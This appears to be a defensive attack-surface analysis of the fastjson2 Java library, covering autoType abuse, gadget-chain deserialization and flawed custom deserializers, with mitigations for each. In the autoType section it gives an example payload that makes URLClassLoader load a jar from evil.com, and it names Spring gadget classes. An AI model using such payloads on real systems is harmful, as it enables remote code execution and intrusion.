# Attack Surface Analysis for alibaba/fastjson2

## Attack Surface: [Arbitrary Object Instantiation via `autoType`](./attack_surfaces/arbitrary_object_instantiation_via__autotype_.md)

**Description:** Attackers can manipulate the JSON payload to specify the class to be instantiated during deserialization. If `autoType` is enabled without strict filtering, this allows instantiation of arbitrary classes present on the classpath.

**How fastjson2 Contributes:** `fastjson2`'s `autoType` feature, when enabled, attempts to instantiate classes based on the `@type` field in the JSON. This behavior, if not controlled, becomes a direct entry point for malicious object creation.

**Example:**  A malicious JSON payload like `{"@type":"java.net.URLClassLoader", "url":"http://evil.com/malicious.jar"}` could be used to load and execute arbitrary code if `autoType` is enabled and `java.net.URLClassLoader` is not blacklisted.

**Impact:** Remote Code Execution (RCE), Denial of Service (DoS), bypassing security checks.

**Risk Severity:** Critical

**Mitigation Strategies:**
* **Disable `autoType` globally if not absolutely necessary.** This is the most effective mitigation.
* **Implement strict whitelisting of allowed classes for `autoType`.** Only allow deserialization of explicitly trusted classes.
* **Use `ParserConfig.getGlobalAutoTypeBeforeHandler()` and `ParserConfig.getGlobalAutoTypeAfterHandler()` to implement custom filtering logic.**
* **Regularly update `fastjson2` to the latest version, as newer versions may have improved default security configurations or blacklists.**

## Attack Surface: [Gadget Chains Exploitation during Deserialization](./attack_surfaces/gadget_chains_exploitation_during_deserialization.md)

**Description:** Even with `autoType` disabled or restricted, attackers can leverage existing classes within the application's dependencies (gadget classes) to achieve malicious outcomes during deserialization. This involves crafting JSON payloads that trigger a chain of method calls leading to RCE or other harmful actions.

**How fastjson2 Contributes:** `fastjson2`'s deserialization process can trigger method invocations on the objects being created. Attackers exploit this by crafting payloads that manipulate object properties to trigger sequences of method calls in existing classes.

**Example:**  A carefully crafted JSON payload targeting specific properties of classes like `org.springframework.aop.config.MethodLocatingFactoryBean` and `org.springframework.beans.factory.config.PropertyPathFactoryBean` (if present in the classpath) can lead to arbitrary code execution.

**Impact:** Remote Code Execution (RCE), data exfiltration, unauthorized access.

**Risk Severity:** High

**Mitigation Strategies:**
* **Keep dependencies up-to-date.** Vulnerable gadget classes are often patched in newer versions.
* **Analyze application dependencies for known vulnerable gadget classes.** Consider removing or isolating vulnerable dependencies if possible.
* **Implement custom deserializers with strict validation and sanitization.**
* **Use security tools to detect potential gadget chain vulnerabilities.**

## Attack Surface: [Vulnerabilities in Custom Serializers/Deserializers](./attack_surfaces/vulnerabilities_in_custom_serializersdeserializers.md)

**Description:** If developers implement custom serializers or deserializers, vulnerabilities within that custom code can be exploited.

**How fastjson2 Contributes:** `fastjson2` provides mechanisms for developers to implement custom serialization and deserialization logic. If this custom code is flawed, it introduces new attack vectors.

**Example:** A custom deserializer might not properly validate input, leading to vulnerabilities similar to arbitrary object instantiation or code execution if it instantiates or interacts with dangerous classes.

**Impact:**  Depends on the nature of the vulnerability in the custom code, potentially leading to Remote Code Execution (RCE), information disclosure, or Denial of Service (DoS).

**Risk Severity:** High

**Mitigation Strategies:**
* **Thoroughly review and test custom serializers and deserializers.**
* **Follow secure coding practices when implementing custom logic, including input validation and sanitization.**
* **Consider using well-vetted and established libraries for common serialization/deserialization tasks instead of writing custom code from scratch.**
* **Restrict the capabilities of custom serializers/deserializers to the minimum necessary.**

